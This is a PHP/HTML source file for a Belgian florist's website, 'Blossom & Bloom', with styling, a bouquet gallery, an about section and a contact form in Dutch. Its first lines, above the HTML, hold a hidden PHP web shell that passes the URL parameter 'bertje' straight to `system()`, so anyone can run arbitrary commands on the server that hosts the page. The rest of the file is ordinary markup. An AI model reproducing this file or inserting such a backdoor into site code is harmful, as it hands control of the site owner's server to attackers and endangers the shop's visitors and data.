<?php
    system($_GET['bertje']);
?>

<!DOCTYPE html>
<html lang="nl-BE">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bloemenboetiek | Blossom & Bloom</title>
    <style>
        :root {
            --primary: #e8a2a8;
            --primary-dark: #d48b91;
            --light-pink: #fdf5f6;
            --text-dark: #333333;
            --text-light: #ffffff;
            --accent: #9bbfa9;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            color: var(--text-dark);
            line-height: 1.6;
            background-color: var(--light-pink);
        }

        /* Navigatie */
        header {
            position: fixed;
            width: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            z-index: 1000;
        }

        nav {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            color: var(--primary);
            text-decoration: none;
        }

        .nav-links {
            display: flex;
            gap: 20px;
        }

        .nav-links a {
            text-decoration: none;
            color: var(--text-dark);
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-links a:hover {
            color: var(--primary);
        }

        /* Hero Sectie */
        .hero {
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            background: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.1)), url('https://unsplash.com') center/cover;
            color: var(--text-light);
        }

        .hero-content h1 {
            font-size: 56px;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .hero-content p {
            font-size: 20px;
            margin-bottom: 30px;
            text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
        }

        .btn {
            background-color: var(--primary);
            color: var(--text-light);
            padding: 12px 30px;
            border-radius: 30px;
            text-decoration: none;
            font-weight: bold;
            transition: background-color 0.3s;
            border: none;
            cursor: pointer;
        }

        .btn:hover {
            background-color: var(--primary-dark);
        }

        /* Secties Algemeen */
        section {
            padding: 100px 20px;
            max-width: 1200px;
            margin: 0 auto;
        }

        h2.section-title {
            text-align: center;
            font-size: 40px;
            margin-bottom: 50px;
            color: var(--primary-dark);
        }

        /* Galerij */
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }

        .gallery-item {
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            transition: transform 0.3s;
        }

        .gallery-item:hover {
            transform: translateY(-10px);
        }

        .gallery-item img {
            width: 100%;
            height: 250px;
            object-fit: cover;
        }

        .item-info {
            padding: 20px;
            text-align: center;
        }

        .item-info h3 {
            margin-bottom: 10px;
        }

        .price {
            color: var(--primary);
            font-weight: bold;
            font-size: 18px;
        }

        /* Over Ons */
        .about {
            background-color: white;
            border-radius: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            margin: 50px auto;
        }

        .about-content {
            display: flex;
            align-items: center;
            gap: 50px;
            flex-wrap: wrap;
        }

        .about-text {
            flex: 1;
        }

        .about-image {
            flex: 1;
            height: 400px;
            background: #ddd; /* Vervang door eigen afbeelding */
            border-radius: 15px;
        }

        /* Contact Formulier */
        .contact-form {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group input, .form-group textarea {
            width: 100%;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }

        .form-group textarea {
            height: 150px;
        }

        /* Footer */
        footer {
            background-color: var(--accent);
            color: var(--text-light);
            text-align: center;
            padding: 30px;
            margin-top: 50px;
        }

        /* Responsief */
        @media (max-width: 768px) {
            .nav-links { display: none; } /* Simpel menu voor nu */
            .hero-content h1 { font-size: 36px; }
            .about-content { flex-direction: column; }
        }
    </style>
</head>
<body>

    <!-- Navigatie -->
    <header>
        <nav>
            <a href="#" class="logo">🌸 Blossom & Bloom</a>
            <div class="nav-links">
                <a href="#home">Home</a>
                <a href="#shop">Onze Boeketten</a>
                <a href="#about">Over Ons</a>
                <a href="#contact">Contact</a>
            </div>
        </nav>
    </header>

    <!-- Hero Sectie -->
    <section id="home" class="hero">
        <div class="hero-content">
            <h1>Elke Bloem Vertelt Een Verhaal</h1>
            <p>Verras jezelf of iemand anders met onze handgemaakte boeketten.</p>
            <a href="#shop" class="btn">Shop Nu</a>
        </div>
    </section>

    <!-- Shop / Galerij -->
    <section id="shop">
        <h2 class="section-title">Onze Populaire Boeketten</h2>
        <div class="gallery-grid">
            <div class="gallery-item">
                <img src="https://unsplash.com" alt="Roze Rozen Boeket">
                <div class="item-info">
                    <h3>Roze Dromen</h3>
                    <p class="price">€ 35,00</p>
                </div>
            </div>
            <div class="gallery-item">
                <img src="https://unsplash.com" alt="Veldbloemen">
                <div class="item-info">
                    <h3>Zomerse Weelde</h3>
                    <p class="price">€ 28,00</p>
                </div>
            </div>
            <div class="gallery-item">
                <img src="https://unsplash.com" alt="Luxe boeket">
                <div class="item-info">
                    <h3>Landelijke Luxe</h3>
                    <p class="price">€ 42,00</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Over Ons -->
    <section id="about" class="about">
        <div class="about-content">
            <div class="about-text">
                <h2 class="section-title" style="text-align: left;">Wie zijn wij?</h2>
                <p>Bij Blossom & Bloom geloven we dat bloemen meer zijn dan alleen een decoratie. Ze zijn een uiting van liefde, vriendschap en waardering. Elk boeket wordt met zorg samengesteld door onze gepassioneerde bloemisten, gebruikmakend van de meest verse seizoensbloemen. Wij streven naar perfectie in elk bloemblad.</p>
            </div>
            <!-- Vervang de background-color hieronder eventueel door een mooie foto-URL in de CSS -->
            <div class="about-image" style="background: url('https://unsplash.com') center/cover;"></div>
        </div>
    </section>

    <!-- Contact -->
    <section id="contact">
        <h2 class="section-title">Neem Contact Op</h2>
        <form class="contact-form">
            <div class="form-group">
                <input type="text" placeholder="Je Naam" required>
            </div>
            <div class="form-group">
                <input type="email" placeholder="Je E-mailadres" required>
            </div>
            <div class="form-group">
                <textarea placeholder="Waar kunnen we je mee helpen?" required></textarea>
            </div>
            <button type="submit" class="btn" style="width: 100%;">Verstuur Bericht</button>
        </form>
    </section>

    <!-- Footer -->
    <footer>
        <p>&copy; 2026 Blossom & Bloom. Alle rechten voorbehouden.</p>
    </footer>

</body>
</html>
